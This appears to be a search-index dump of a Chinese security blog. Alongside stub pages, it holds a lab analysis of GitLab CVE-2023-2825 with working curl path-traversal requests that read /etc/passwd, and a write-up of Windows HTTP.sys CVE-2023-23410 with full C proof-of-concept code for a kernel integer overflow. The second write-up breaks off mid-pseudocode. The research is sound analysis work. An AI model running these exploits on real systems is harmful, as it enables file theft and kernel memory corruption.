[{"uri":"https://www.ch35tnut.site/zh-cn/vulnerability/windows-clfs-eop/","title":"Windows CLFS EoP","tags":[],"description":"","content":"Chapter X Some Chapter title 序号 漏洞名 编号 类型 2 windows CLFS 权限提升漏洞 CVE-2023-28252 权限提升 1 windows CLFS 权限提升漏洞 CVE-2022-37969 权限提升 "},{"uri":"https://www.ch35tnut.site/zh-cn/research/windows/","title":"Windows","tags":[],"description":"","content":"Chapter X Some Chapter title Lorem Ipsum.\n"},{"uri":"https://www.ch35tnut.site/zh-cn/research/protocol/ntlm/","title":"Ntlm 协议","tags":[],"description":"","content":"Chapter X Some Chapter title Lorem Ipsum.\n"},{"uri":"https://www.ch35tnut.site/zh-cn/research/protocol/","title":"协议","tags":[],"description":"","content":"Chapter X Some Chapter title Lorem Ipsum.\n"},{"uri":"https://www.ch35tnut.site/zh-cn/research/web/","title":"Web","tags":[],"description":"","content":"web Web安全研究相关\n"},{"uri":"https://www.ch35tnut.site/zh-cn/research/code-audit/","title":"代码审计","tags":[],"description":"","content":"代码审计 "},{"uri":"https://www.ch35tnut.site/zh-cn/research/protocol/kerberos/kerberos-in-windows/","title":"Windows中的kerberos协议","tags":[],"description":"","content":"Chapter X Some Chapter title Lorem Ipsum.\n"},{"uri":"https://www.ch35tnut.site/zh-cn/research/protocol/kerberos/","title":"Kerberos 协议","tags":[],"description":"","content":"kerberos协议研究 "},{"uri":"https://www.ch35tnut.site/zh-cn/research/windows/dll-inject/","title":"Dll注入","tags":[],"description":"","content":"Dll注入研究 "},{"uri":"https://www.ch35tnut.site/zh-cn/misc/tunnel/transport-layer/socks/","title":"Socks协议","tags":[],"description":"","content":"Chapter X Some Chapter title Lorem Ipsum.\n"},{"uri":"https://www.ch35tnut.site/zh-cn/misc/tunnel/","title":"隧道","tags":[],"description":"","content":"Chapter X Some Chapter title Lorem Ipsum.\n"},{"uri":"https://www.ch35tnut.site/zh-cn/misc/tunnel/application-layer/","title":"应用层隧道","tags":[],"description":"","content":"Chapter X Some Chapter title Lorem Ipsum.\n"},{"uri":"https://www.ch35tnut.site/zh-cn/misc/tunnel/transport-layer/","title":"传输层隧道","tags":[],"description":"","content":"Chapter X Some Chapter title Lorem Ipsum.\n"},{"uri":"https://www.ch35tnut.site/zh-cn/misc/tunnel/network-layer/","title":"网络层隧道","tags":[],"description":"","content":"Chapter X Some Chapter title Lorem Ipsum.\n"},{"uri":"https://www.ch35tnut.site/zh-cn/research/","title":"安全研究","tags":[],"description":"","content":"安全研究 "},{"uri":"https://www.ch35tnut.site/zh-cn/research/windows/pe/","title":"Pe","tags":[],"description":"","content":"Chapter X Some Chapter title Lorem Ipsum.\n"},{"uri":"https://www.ch35tnut.site/zh-cn/vulnerability/","title":"漏洞分析","tags":[],"description":"","content":"漏洞分析 一些漏洞分析文章。\n序号 漏洞名 编号 类型 状态 ☐ 15 ☑ 14 Windows CLFS 权限提升漏洞系列 权限提升 ✗ 13 gitlab 目录穿越漏洞 CVE-2023-2825 信息泄露 ✓ 12 zero logon分析 CVE-2020-1472 权限提升 ✗ 11 windows http.sys 权限提升漏洞 CVE-2023-23410 权限提升 ✓ 10 TerraMaster TOS代码执行漏洞 CVE-2022-24990 代码执行 ✗ 9 PgAdmin 代码执行漏洞 CVE-2022-4223 代码执行 ✗ 8 sudo权限提升漏洞 CVE-2021-3156 权限提升 ✗ 7 Minio信息泄露漏洞 CVE-2023-28432 信息泄露 ✗ 6 Strapi 代码执行漏洞链 代码执行 ✗ 5 Outlook 权限提升漏洞 CVE-2023-23397 权限提升 ✗ 4 OWASSRF 和 TabShell分析 CVE-2022-41080 CVE-2022-41076 代码执行 ✗ 3 proxy not shell 漏洞链 CVE-2022-41040 CVE-2022-41082 代码执行 ✗ 2 proxy shell 漏洞链 CVE-2021-34473 CVE-2021-34523 CVE-2021-31207 代码执行 ✗ 1 win32k 权限提升漏洞 CVE-2021-40449 权限提升 ✓ "},{"uri":"https://www.ch35tnut.site/zh-cn/","title":"首页","tags":[],"description":"","content":"学习记录 记录一些平时学习和生活的日常。\n09-13至09-16\r| 263 days ago\r这周再写一个基于rust的loader，写了一半发现加载的dll太多了，再想办法用动态加载的方式加载dll，感觉用rust做有点难。\n用rust的内联汇编获取到了kernel32.dll和ntdll.dll的基址，还要继续完善。\n2023\r09-10至09-12\r2 days | 266 days ago\r中秋节，在家摸了几天🐟，啥都没干\n2023\r09-05至09-09\r4 days | 271 days ago\r这周编译了wireshark 1.8.5，通过diff1.8.5和1.8.6的源码找出1.8.5里面的漏洞，见\rwireshark 1.8.5代码审计\n2023\r09-03至09-04\r1 day | 273 days ago\r这两天，给hugo主题增加了timeline的shortcode，见\r增加timeline功能\n2023\r08-29至09-02\r4 days | 278 days ago\r周内看了一个几百行的代码，见\rnews_server审计\n2023\r黑客精神：Open, Share, Free\n"},{"uri":"https://www.ch35tnut.site/zh-cn/dailylife/","title":"生活随笔","tags":[],"description":"","content":"Chapter X Some Chapter title Lorem Ipsum.\n"},{"uri":"https://www.ch35tnut.site/zh-cn/misc/","title":"杂项","tags":[],"description":"","content":"杂项 暂无\n"},{"uri":"https://www.ch35tnut.site/zh-cn/others/","title":"其他","tags":[],"description":"","content":"其他 "},{"uri":"https://www.ch35tnut.site/zh-cn/vulnerability/cve-2023-2825-gitlab-path-traversal/","title":"CVE-2023-2825 Gitlab 路径穿越漏洞分析","tags":[],"description":"","content":"基本信息 在GitLab 中，当一个附件存在于一个项目中，并且该项目在嵌套了至少五层的组内，攻击者才可以利用这个漏洞进行目录穿越，读取服务器上的文件。\n影响版本 GitLab 16.0.0\n环境搭建 用docker起环境\ndocker pull gitlab/gitlab-ce:16.0.0-ce.0 docker run -d -p 443:443 -p 80:80 -p 222:22 --name gitlab --restart always -v /home/gitlab/config:/etc/gitlab -v /home/gitlab/logs:/var/log/gitlab -v /home/gitlab/data:/var/opt/gitlab gitlab/gitlab-ce:16.0.0-ce.0 技术分析\u0026amp;调试 一开始以为是普通的目录穿越，先diff看怎么修的，注意到16.0.1新增了spec\\support\\shared_examples\\requests\\uploads_actions_shared_examples.rb 文件。\n根据该文件内容判断应该是这个漏洞的单元测试文件，没学过ruby，先把这段代码扔给ChatGPT看看\n# frozen_string_literal: true RSpec.shared_examples \u0026#39;uploads actions\u0026#39; do describe \u0026#34;GET #show\u0026#34; do context \u0026#39;with file traversal in filename parameter\u0026#39; do # Uploads in tests are stored in directories like: # tmp/tests/public/uploads/@hashed/AB/CD/ABCD/SECRET let(:filename) { \u0026#34;../../../../../../../../../Gemfile.lock\u0026#34; } let(:escaped_filename) { CGI.escape filename } it \u0026#39;responds with status 400\u0026#39; do # Check files do indeed exists upload_absolute_path = Pathname(upload.absolute_path) expect(upload_absolute_path).to be_exist attacked_file_path = upload_absolute_path.dirname.join(filename) expect(attacked_file_path).to be_exist # Need to escape, otherwise we get `ActionController::UrlGenerationError Exception: No route matches` get show_path.sub(File.basename(upload.path), escaped_filename) expect(response).to have_gitlab_http_status(:bad_request) end end end end ChatGPT回答：\n这段Ruby代码定义了一个RSpec共享示例，名为“uploads actions”，它包含一个测试用例。这个测试用例测试了在文件名参数中发生文件遍历攻击时服务器的响应行为。 在测试用例中，首先定义了两个变量：filename和escaped_filename。filename变量是一个字符串，它代表将被攻击的文件名。escaped_filename变量是对filename进行URL编码后的结果，这是为了避免请求URL中使用不安全的字符可能会导致意外的结果。 然后，该测试用例检查上传的文件是否存在，之后构造一个恶意URL请求来执行文件遍历攻击，请求一个非法文件。具体而言，它使用Pathname类来获取上传文件的绝对路径，然后使用File.basename和String#sub方法来构造恶意URL请求。最后，使用RSpec的expect语句来检查服务器的响应状态码是否为400（bad_request）。 总之，这个RSpec共享示例测试了服务器是否能够防止文件遍历攻击，并正确地处理恶意请求。 根据有限的知识结合ChatGPT回答，可以知道这段代码首先定义了目录穿越的payload：../../../../../../../../../Gemfile.lock 而后将其进行url编码并赋值给escaped_filename。\n之后将上传目录的路径和这个payload拼接并判断这个路径是否存在。之后通过String.sub函数将上传路径的文件名替换成了escaped_filename，并用RSpec 框架的get函数发起请求。\n结合该单元测试的注释，可以知道，大概payload如下\n/url/to/upload/%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2FGemfile%2Elock # Uploads in tests are stored in directories like: # tmp/tests/public/uploads/@hashed/AB/CD/ABCD/SECRET 在通过官方文档知道如何通过API上传附件\ncurl --request POST --header \u0026#34;PRIVATE-TOKEN: \u0026lt;your_access_token\u0026gt;\u0026#34; \\ --form \u0026#34;file=@dk.png\u0026#34; \u0026#34;https://gitlab.example.com/api/v4/projects/5/uploads\u0026#34; https://github.com/gitlabhq/gitlabhq/blob/master/doc/api/projects.md#upload-a-file\n这里先用Administrator上传一个附件看看（已提前建好相应的组和项目）\n$ curl --request POST --header \u0026#34;PRIVATE-TOKEN: glpat-Py3rEGA_SPngPn-2LzsR\u0026#34; --form \u0026#34;file=@3.txt\u0026#34; \u0026#34;http://192.168.59.197/api/v4/projects/g1%2Fg2%2Fg3%2Fg4%2Fg5%2Fg6%2Fg7%2Fg8%2Fg9%2Fp4/uploads\u0026#34; {\u0026#34;alt\u0026#34;:\u0026#34;3.txt\u0026#34;,\u0026#34;url\u0026#34;:\u0026#34;/uploads/3fc9a510049cd6bbee4507d21164020f/3.txt\u0026#34;,\u0026#34;full_pat h\u0026#34;:\u0026#34;/g1/g2/g3/g4/g5/g6/g7/g8/g9/p4/uploads/3fc9a510049cd6bbee4507d21164020f/3.tx t\u0026#34;,\u0026#34;markdown\u0026#34;:\u0026#34;[3.txt](/uploads/3fc9a510049cd6bbee4507d21164020f/3.txt)\u0026#34;} 可以看到已经返回了一个url，不难看出和单元测试里面的注释的路径长得很像，这里用自己的payload替换3.txt\n$ curl http://192.168.59.197/g1/g2/g3/g4/g5/g6/g7/g8/g9/p4/uploads/3fc9a510049cd6bbee4507d21164020f/%2e%2e%2F%2e%2e%2F%2e%2e%2F%2e%2e%2F%2e%2e%2F%2e%2e%2F%2e%2e%2F%2e%2e%2F%2e%2e%2F%2e%2e%2F%2e%2e%2F%2e%2e%2Fetc%2fpasswd root:x:0:0:root:/root:/bin/bash daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin bin:x:2:2:bin:/bin:/usr/sbin/nologin sys:x:3:3:sys:/dev:/usr/sbin/nologin sync:x:4:65534:sync:/bin:/bin/sync games:x:5:60:games:/usr/games:/usr/sbin/nologin man:x:6:12:man:/var/cache/man:/usr/sbin/nologin lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin mail:x:8:8:mail:/var/mail:/usr/sbin/nologin news:x:9:9:news:/var/spool/news:/usr/sbin/nologin uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin proxy:x:13:13:proxy:/bin:/usr/sbin/nologin www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin backup:x:34:34:backup:/var/backups:/usr/sbin/nologin list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologi n nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin _apt:x:100:65534::/nonexistent:/usr/sbin/nologin sshd:x:101:65534::/run/sshd:/usr/sbin/nologin git:x:998:998::/var/opt/gitlab:/bin/sh gitlab-www:x:999:999::/var/opt/gitlab/nginx:/bin/false gitlab-redis:x:997:997::/var/opt/gitlab/redis:/bin/false gitlab-psql:x:996:996::/var/opt/gitlab/postgresql:/bin/sh mattermost:x:994:994::/var/opt/gitlab/mattermost:/bin/sh registry:x:993:993::/var/opt/gitlab/registry:/bin/sh gitlab-prometheus:x:992:992::/var/opt/gitlab/prometheus:/bin/sh gitlab-consul:x:991:991::/var/opt/gitlab/consul:/bin/sh 分析\n到现在有两个问题\n为什么要求payload需要经过url编码 为什么要12个穿越符才能到根目录 在哪个代码触发的漏洞 首先是第一个问题，GitLab架构为nginx ↔Workhorse↔puma，起初以为将目录穿越进行url编码是绕过nginx解析，举个例子，当访问/1/2/3/4/5/6/../../../index.php时nginx实际会访问/1/2/3/index.php，即会进行拼接然后访问，所以一开始判断的是将payload进行url编码绕过这个过程，而后和其他师傅讨论才发现，虽然将payload进行编码但nginx会将url里面url编码的部分进行解码然后拼接，所以url编码不是为了绕过nginx解析。在前面使用api上传文件时，文档特别强调了上传目标路径需要进行url编码，这里推测应该是GitLab内会进行url解码在进行处理。\n第二个问题为什么需要12个穿越符，经过测试发现文件实际上传在/var/opt/gitlab/gitlab-rails/uploads/@hashed 目录下，但在代码中使用的是/opt/gitlab/embedded/service/gitlab-rails/public/uploads/@hashed/ 其中uploads软连接到了/var/opt/gitlab/gitlab-rails/uploads目录，在上传一个文件后，文件路径为/opt/gitlab/embedded/service/gitlab-rails/public/uploads/@hashed/4b/22/4b227777d4dd1fc61c6f884f48641d02b4d121d3fd328cb08b5531fcacdabf8a/34c2b7fc66dcfbfe0b65513260ad0510/3.txt 不难看出共有12层目录所以需要12个穿越符，在触发漏洞时url为/path/to/group/project/uploads/@hashed，结合绕过nginx解析，所以至少需要9个组才能有足够的嵌套层数绕过nginx的url解析。\n第三个问题，回到补丁对比，补丁主要在以下两个文件添加了防护目录穿越的代码，在show方法处对filename进行url解码而后调用 Gitlab::Utils.check_path_traversal!(params[:filename]) 检查url解码后的参数是否存在目录穿越。\napp\\uploaders\\object_storage.rb def retrieve_from_store!(identifier) Gitlab::Utils.check_path_traversal!(identifier) # We need to force assign the value of @filename so that we will still # get the original_filename in cases wherein the file points to a random generated # path format. This happens for direct uploaded files to final location. # # If we don\u0026#39;t set @filename value here, the result of uploader.filename (see ObjectStorage#filename) will result # to the value of uploader.file.filename which will then contain the random generated path. # The `identifier` variable contains the value of the `file` column which is the original_filename. # # In cases wherein we are not uploading to final location, it is still fine to set the # @filename with the `identifier` value because it still contains the original filename from the `file` column, # which is what we want in either case. @filename = identifier # rubocop: disable Gitlab/ModuleWithInstanceVariables super end private app\\controllers\\concerns\\uploads_actions.rb def show Gitlab::Utils.check_path_traversal!(params[:filename]) return render_404 unless uploader\u0026amp;.exists? ttl, directives = *cache_settings ttl ||= 0 directives ||= { private: true, must_revalidate: true } expires_in ttl, directives file_uploader = [uploader, *uploader.versions.values].find do |version| version.filename == params[:filename] end return render_404 unless file_uploader workhorse_set_content_type! send_upload(file_uploader, attachment: file_uploader.filename, disposition: content_disposition) end 再来看Gitlab::Utils.check_path_traversal函数，其定义在lib\\gitlab\\utils.rb\ndef check_path_traversal!(path) return unless path path = path.to_s if path.is_a?(Gitlab::HashedPath) raise PathTraversalAttackError, \u0026#39;Invalid path\u0026#39; unless path.is_a?(String) path = decode_path(path) path_regex = %r{(\\A(\\.{1,2})\\z|\\A\\.\\.[/\\\\]|[/\\\\]\\.\\.\\z|[/\\\\]\\.\\.[/\\\\]|\\n)} if path.match?(path_regex) logger.warn(message: \u0026#34;Potential path traversal attempt detected\u0026#34;, path: \u0026#34;#{path}\u0026#34;) raise PathTraversalAttackError, \u0026#39;Invalid path\u0026#39; end path end 这个函数接收一个路径，而后用正则表达式进行匹配，如果匹配到了则抛出PathTraversalAttackError 错误，把这段正则表达式给ChatGPT，给出了如下解释，所以代码调用这个函数可以检查是否存在恶意的目录穿越。\n这个正则表达式也是用来匹配文件路径字符串中的相对路径（如\u0026#34;./\u0026#34;、\u0026#34;../\u0026#34;等）的，它的含义与前一个问题中的正则表达式非常相似，只是使用了不同的语法来表示相同的含义。具体来说，这个正则表达式的含义如下： json \\A 匹配字符串的开头 (.{1,2}) 匹配一个或两个任意字符，并将其作为一个分组 \\z 匹配字符串的结尾 | 或 \\A..\\[/\\\\] 匹配以\u0026#34;../\u0026#34;开头的字符串 | 或 [/\\\\]..\\z 匹配以\u0026#34;/..\u0026#34;结尾的字符串 | 或 [/\\\\]..\\[/\\\\] 匹配\u0026#34;/../\u0026#34;或\u0026#34;\\..\\\u0026#34;这样以\u0026#34;/\u0026#34;或\u0026#34;\\\u0026#34;开头且以\u0026#34;/\u0026#34;或\u0026#34;\\\u0026#34;结尾的字符串 | 或 \\n 匹配换行符 ) 分组结束 其中，\\A、\\z和\\n分别代表字符串的开头、结尾和换行符，|表示或的关系，[/\\\\]用来匹配\u0026#34;\u0026#34;或\u0026#34;/\u0026#34;这两种目录分隔符，因为在不同的操作系统中，目录分隔符是不同的。 这个正则表达式的作用是匹配一个相对路径字符串，用来检测是否存在不合法的相对路径，例如路径中包含超出根目录的\u0026#34;../\u0026#34;或者\u0026#34;..\u0026#34;这样的字符串，或者以\u0026#34;../\u0026#34;开头或以\u0026#34;/..\u0026#34;结尾。如果匹配成功，说明该路径存在不合法的相对路径，需要进行处理或报错。 补丁还以下路径新增了文件，不难看出是在定义了module和upload对象，而后定义了一个字符串show_path并把它传给了config/routes/uploads.rb执行。\nspec\\requests\\uploads_controller_spec.rb # frozen_string_literal: true require \u0026#39;spec_helper\u0026#39; RSpec.describe UploadsController, feature_category: :shared do include WorkhorseHelpers it_behaves_like \u0026#39;uploads actions\u0026#39; do let_it_be(:model) { create(:personal_snippet, :public) } let_it_be(:upload) { create(:upload, :personal_snippet_upload, :with_file, model: model) } # See config/routes/uploads.rb let(:show_path) do \u0026#34;/uploads/-/system/#{model.model_name.singular}/#{model.to_param}/#{upload.secret}/#{File.basename(upload.path)}\u0026#34; end end end 在config/routes/uploads.rb中，定义了路由匹配规则用来处理上传文件和显示文件的请求，结合spec\\requests\\uploads_controller_spec.rb的内容可以知道应该是在处理路由get '-/system/:model/:id/:secret/:filename'时，将文件名传给uploads模块的show方法触发漏洞。\nconfig/routes/uploads.rb # frozen_string_literal: true scope path: :uploads do # Note attachments and User/Group/Project/Topic avatars get \u0026#34;-/system/:model/:mounted_as/:id/:filename\u0026#34;, to: \u0026#34;uploads#show\u0026#34;, constraints: { model: %r{note|user|group|project|projects\\/topic|achievements\\/achievement}, mounted_as: /avatar|attachment/, filename: %r{[^/]+} } # show uploads for models, snippets (notes) available for now get \u0026#39;-/system/:model/:id/:secret/:filename\u0026#39;, to: \u0026#39;uploads#show\u0026#39;, constraints: { model: /personal_snippet|user/, id: /\\d+/, filename: %r{[^/]+} } # show temporary uploads get \u0026#39;-/system/temp/:secret/:filename\u0026#39;, to: \u0026#39;uploads#show\u0026#39;, constraints: { filename: %r{[^/]+} } # Appearance get \u0026#34;-/system/:model/:mounted_as/:id/:filename\u0026#34;, to: \u0026#34;uploads#show\u0026#34;, constraints: { model: /appearance/, mounted_as: /logo|header_logo|pwa_icon|favicon/, filename: /.+/ }, as: \u0026#39;appearance_upload\u0026#39; # create uploads for models, snippets (notes) available for now post \u0026#39;:model\u0026#39;, to: \u0026#39;uploads#create\u0026#39;, constraints: { model: /personal_snippet|user/, id: /\\d+/ }, as: \u0026#39;upload\u0026#39; post \u0026#39;:model/authorize\u0026#39;, to: \u0026#39;uploads#authorize\u0026#39;, constraints: { model: /personal_snippet|user/ } # Alert Metric Images get \u0026#34;-/system/:model/:mounted_as/:id/:filename\u0026#34;, to: \u0026#34;uploads#show\u0026#34;, constraints: { model: /alert_management_metric_image/, mounted_as: /file/, filename: %r{[^/]+} }, as: \u0026#39;alert_metric_image_upload\u0026#39; # Abuse Reports Images get \u0026#34;-/system/:model/:mounted_as/:id/:filename\u0026#34;, to: \u0026#34;uploads#show\u0026#34;, constraints: { model: /abuse_report/, mounted_as: /screenshot/, filename: %r{[^/]+} }, as: \u0026#39;abuse_report_upload\u0026#39; end # Redirect old note attachments path to new uploads path. get \u0026#34;files/note/:id/:filename\u0026#34;, to: redirect(\u0026#34;uploads/note/attachment/%{id}/%{filename}\u0026#34;), constraints: { filename: %r{[^/]+} } 坑点 组层数不够\n原先按照官方通告说的至少5层组嵌套，就只新建了5层，而后发送payload，一直报400，一度以为环境是16.0.1修复版本，而后发现是嵌套不够。\n$ curl http://192.168.59.197/g1/g2/g3/g4/g5/p1/uploads/dec19360ec8b52993908879181719de3/%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2Fetc%2Fpasswd%20 \u0026lt;html\u0026gt; \u0026lt;head\u0026gt;\u0026lt;title\u0026gt;400 Bad Request\u0026lt;/title\u0026gt;\u0026lt;/head\u0026gt; \u0026lt;body\u0026gt; \u0026lt;center\u0026gt;\u0026lt;h1\u0026gt;400 Bad Request\u0026lt;/h1\u0026gt;\u0026lt;/center\u0026gt; \u0026lt;hr\u0026gt;\u0026lt;center\u0026gt;nginx\u0026lt;/center\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; 后来得到同事提示，需要至少9层才可以访问到根目录。\n穿越符不够\n经测试，至少需要12个穿越符../ 才能成功穿越到根目录\n小结\n本次漏洞分析有点事后诸葛亮，从已知的PoC推测触发的文件路径，但总算成功理解了整个触发文件流，坑点就是nginx解析导致需要足够的group才能穿越到根目录，分析这个漏洞的时候没学过ruby，依靠ChatGPT才能够理解某些代码。\nCreated at 2023-05-26T10:36:20+08:00\n"},{"uri":"https://www.ch35tnut.site/zh-cn/vulnerability/cve-2023-23410-windows-http-sys-eop/","title":"CVE-2023-23410 Windows HTTP.sys 权限提升漏洞","tags":[],"description":"","content":"基本信息 在http.sys中存在整数溢出漏洞，攻击者可以利用整数溢出漏洞绕过字段大小检查，导致在调用memcpy时传入超出缓冲区大小的长度参数，造成内存溢出。\n环境搭建 操作系统 windows 10 调试器 windbg 技术分析\u0026amp;调试 PoC\n#define _WIN32_WINNT 0x0A00 #define SECURITY_WIN32 #include \u0026lt;http.h\u0026gt; #include \u0026lt;sspi.h\u0026gt; #include \u0026lt;strsafe.h\u0026gt; #pragma warning(disable : 4127) // condition expression is constant int __cdecl wmain(int argc, __in_ecount(argc) wchar_t *argv[]) { HANDLE hReqQueue = NULL; HTTPAPI_VERSION HttpApiVersion = HTTPAPI_VERSION_2; HTTP_SERVER_SESSION_ID ssID = HTTP_NULL_ID; ULONG retCode; HTTP_URL_GROUP_ID urlGroupId = HTTP_NULL_ID; // 初始化HTTP服务器驱动 retCode = HttpInitialize(HttpApiVersion, HTTP_INITIALIZE_SERVER, // Flags NULL // Reserved ); if (retCode != NO_ERROR) { wprintf(L\u0026#34;HttpInitialize failed with %lu \\n\u0026#34;, retCode); return retCode; } // 创建服务会话 retCode = HttpCreateServerSession(HttpApiVersion, \u0026amp;ssID, 0); if (retCode != NO_ERROR) { wprintf(L\u0026#34;HttpCreateServerSession failed with %lu \\n\u0026#34;, retCode); return 0; } // 创建url group retCode = HttpCreateUrlGroup(ssID, \u0026amp;urlGroupId, 0); if (retCode != NO_ERROR) { wprintf(L\u0026#34;HttpCreateUrlGroup failed with %lu \\n\u0026#34;, retCode); return 0; } BYTE data_temp1[0x1000] = {0}; DWORD return_len = 0; // 分配 0xfffffe0 大小的堆块 WCHAR *str = HeapAlloc(GetProcessHeap(), 0, 0xfffffe0); WCHAR str_test[0xfffe] = L\u0026#34;192.168.52.133:8081\u0026#34;; memcpy(str, str_test, 0x20); HTTP_CHANNEL_BIND_INFO bind_info; bind_info.Hardening = HttpAuthenticationHardeningLegacy; bind_info.Flags = HTTP_CHANNEL_BIND_PROXY; HTTP_SERVICE_BINDING_W service_binding; HTTP_SERVICE_BINDING_BASE binding_base; binding_base.Type = HttpServiceBindingTypeW; service_binding.Base = binding_base; service_binding.Buffer = str; service_binding.BufferSize = 0xfffffe0 - 0xf0f0f0; // F0F0EF0 PHTTP_SERVICE_BINDING_BASE binding_base_arr[0x11]; PHTTP_SERVICE_BINDING_BASE tmp_binding_base = \u0026amp;service_binding; for (int i = 0; i \u0026lt; 0x11; i++) { binding_base_arr[i] = tmp_binding_base; } bind_info.ServiceNames = binding_base_arr; bind_info.NumberOfServiceNames = 0x11; retCode = HttpSetUrlGroupProperty(urlGroupId, HttpServerChannelBindProperty, \u0026amp;bind_info, 0x20); retCode = HttpQueryUrlGroupProperty(urlGroupId, HttpServerChannelBindProperty, \u0026amp;data_temp1, 0x140, \u0026amp;return_len); } 在http!UlCopyChannelBindConfigToIrp 下断点，运行PoC，此时调用栈为\n1: kd\u0026gt; k # Child-SP RetAddr Call Site 00 fffff889`cd7f76a8 fffff805`7981ae19 HTTP!UlCopyChannelBindConfigToIrp 01 fffff889`cd7f76b0 fffff805`7982caf5 HTTP!UlQueryConfigGroupProperty+0x175 02 fffff889`cd7f7740 fffff805`797130aa HTTP!UlQueryUrlGroupIoctl+0x195 03 fffff889`cd7f77c0 fffff805`6dc954d5 HTTP!UxDeviceControl+0x8a 04 fffff889`cd7f7800 fffff805`6e0a6048 nt!IofCallDriver+0x55 05 fffff889`cd7f7840 fffff805`6e0a5e47 nt!IopSynchronousServiceTail+0x1a8 06 fffff889`cd7f78e0 fffff805`6e0a51c6 nt!IopXxxControlFile+0xc67 07 fffff889`cd7f7a20 fffff805`6de0d8f5 nt!NtDeviceIoControlFile+0x56 08 fffff889`cd7f7a90 00007ff9`c610d1a4 nt!KiSystemServiceCopyEnd+0x25 09 00000014`7dcd6308 00007ff9`b6391b7a ntdll!NtDeviceIoControlFile+0x14 0a 00000014`7dcd6310 00007ff9`b6393c9f HTTPAPI!HttpApiSynchronousDeviceControl+0x8a 0b 00000014`7dcd6390 00007ff6`93fb18b2 HTTPAPI!HttpQueryUrlGroupProperty+0x6f 0c 00000014`7dcd6410 00000000`00000000 http_poc2!wmain+0x3d2 [D:\\code\\c\\http_poc2.c @ 113] http!UlCopyChannelBindConfigToIrp 伪代码如下，该函数调用UxGetOutputBufferForOutDirect 计算存储ChannelBindConfig 所需的内存大小，并和UxGetOutputBufferForOutDirect返回的分配的内存大小作比较：\n__int64 __fastcall UlCopyChannelBindConfigToIrp(__int64 a1, IRP *a2, unsigned int *a3) { ... v8 = UlpComputeChannelBindConfigSize(a1, a2); v43 = v8; if ( IoIs32bitProcess(a2) ) { v36 = 0i64; IoIs32bitProcess(a2); OutputBufferForOutDirect = UxGetOutputBufferForOutDirect( (_DWORD)a2, (_DWORD)CurrentStackLocation, 16, 4, (__int64)\u0026amp;v31, (__int64)\u0026amp;v32, (__int64)\u0026amp;v41); v33 = OutputBufferForOutDirect; if ( OutputBufferForOutDirect \u0026lt; 0 ) goto LABEL_32; if ( v8 \u0026gt; v41 ) { OutputBufferForOutDirect = -2147483643; v33 = -2147483643; if ( (WPP_MAIN_CB.StackSize \u0026amp; 0x20) != 0 ) { v10 = 43i64; LABEL_6: WPP_SF_D(v10, \u0026amp;WPP_64a86ec3d91e339ac994f13222c31d64_Traceguids, 2147483653i64); goto LABEL_32; } goto LABEL_32; } v11 = v31; if ( (*(_DWORD *)a1 \u0026amp; 1) == 0 ) { *(_QWORD *)v31 = 0i64; *(_QWORD *)(v11 + 8) = 0i64; goto LABEL_32; } *(_DWORD *)(v31 + 4) = *(_DWORD *)(a1 + 8); *(_DWORD *)v11 = *(_DWORD *)(a1 + 4); *(_QWORD *)(v11 + 8) = 0i64; v12 = *(_QWORD *)(a1 + 16); if ( !v12 || !*(_DWORD *)(v12 + 16) ) goto LABEL_32; v13 = (v11 + 19) \u0026amp; 0xFFFFFFFFFFFFFFFCui64; v38 = v13; v36 = (_DWORD *)v13; *(_DWORD *)(v11 + 8) = v13 + v32 - v31; *(_DWORD *)(v11 + 12) = *(_DWORD *)(*(_QWORD *)(a1 + 16) + 16i64); v14 = *(unsigned int *)(*(_QWORD *)(a1 + 16) + 16i64); v15 = (_DWORD *)(v13 + 4 * v14); v37 = v15; v16 = (char *)\u0026amp;v15[3 * v14]; v35 = v16; v17 = 0; v34 = 0; while ( v17 \u0026lt; *(_DWORD *)(*(_QWORD *)(a1 + 16) + 16i64) ) { *(_DWORD *)(v13 + 4i64 * v17) = (_DWORD)v15 + v32 - v31; v18 = *(_QWORD *)(*(_QWORD *)(*(_QWORD *)(a1 + 16) + 8i64) + 8i64 * v17); if ( *(_DWORD *)v18 == 2 ) { v36 = v15 + 3; v37 = v15 + 3; *v15 = 2; v15[1] = (_DWORD)v16 + v32 - v31; v15[2] = *(_DWORD *)(v18 + 16); memmove(v16, *(const void **)(v18 + 8), *(unsigned int *)(v18 + 16)); v16 = \u0026amp;v35[*(unsigned int *)(v18 + 16)]; } else { v36 = v15 + 3; v37 = v15 + 3; *v15 = 1; v30 = (char *)((unsigned __int64)(v16 + 1) \u0026amp; 0xFFFFFFFFFFFFFFFEui64); v15[1] = (_DWORD)v30 + v32 - v31; v15[2] = *(_DWORD *)(v18 + 16); memmove(v30, *(const void **)(v18 + 8), *(unsigned int *)(v18 + 16)); v16 = \u0026amp;v30[*(unsigned int *)(v18 + 16)]; } v35 = v16; v34 = ++v17; v15 = v36; v13 = v38; } LABEL_31: v3 = v42; goto LABEL_32; } v38 = 0i64; v19 = IoIs32bitProcess(a2); OutputBufferForOutDirect = UxGetOutputBufferForOutDirect( (_DWORD)a2, (_DWORD)CurrentStackLocation, 24, v19 != 0 ? 4 : 8, (__int64)\u0026amp;v31, (__int64)\u0026amp;v32, (__int64)\u0026amp;v41); v33 = OutputBufferForOutDirect; if ( OutputBufferForOutDirect \u0026lt; 0 ) goto LABEL_32; if ( v8 \u0026gt; v41 ) { OutputBufferForOutDirect = -2147483643; v33 = -2147483643; if ( (WPP_MAIN_CB.StackSize \u0026amp; 0x20) == 0 ) goto LABEL_32; v10 = 44i64; goto LABEL_6; } if ( v21 \u0026amp;\u0026amp; *(_DWORD *)(v21 + 16) ) { ... while ( v26 \u0026lt; *(_DWORD *)(*(_QWORD *)(a1 + 16) + 16i64) ) { *(_QWORD 